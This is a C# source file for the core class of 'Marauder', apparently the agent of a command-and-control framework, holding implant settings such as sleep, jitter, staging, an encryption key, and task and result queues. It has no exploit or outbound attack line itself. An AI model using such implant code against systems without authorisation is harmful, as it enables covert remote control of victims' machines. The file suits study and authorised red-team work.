using System;
using System.Collections.Generic;

using MarauderLib.Objects;
using MarauderLib.Services;

namespace MarauderLib
{
    public class Marauder
    {
        public static string Id;
        public static string PayloadName;
        public static string StagingId;
        public static string Key;    
        public static int Sleep;
        public static double Jitter;
        public static int MaxAttempts;
        public static bool Debug = false;
        public static DateTime? ExpirationDate;
        internal static string LastTaskName;
        internal static List<TaskResult> ResultQueue = new List<TaskResult>();
        internal static List<RunningTask> RunningTasks = new List<RunningTask>();
        internal static CryptoService CryptoService;
        internal static CommandService CommandService;
        internal static event EventHandler<MessageRecievedArgs> OnMessageReceived;  

        public Marauder(string payloadName, string key, int sleep, double jitter, int maxAttempts, 
            DateTime? expirationDate = null, Boolean debug = false)
        {
            PayloadName = payloadName;
            Key = key;
            Sleep = sleep;
            Jitter = jitter;
            MaxAttempts = maxAttempts;
            
            if (expirationDate.HasValue)
            {
                ExpirationDate = expirationDate;
            }

            Debug = debug;
            CryptoService = new CryptoService();
            CommandService = new CommandService();
        }

        public string Stage()
        {
            return CryptoService.CreateStagingMessage();
        }
        
        public void Process(string message)
        {
            OnMessageReceived?.Invoke(this, new MessageRecievedArgs(message));
        }

        public string GetResults()
        {
            return CryptoService.CreateAgentMessage();
        }
    }
}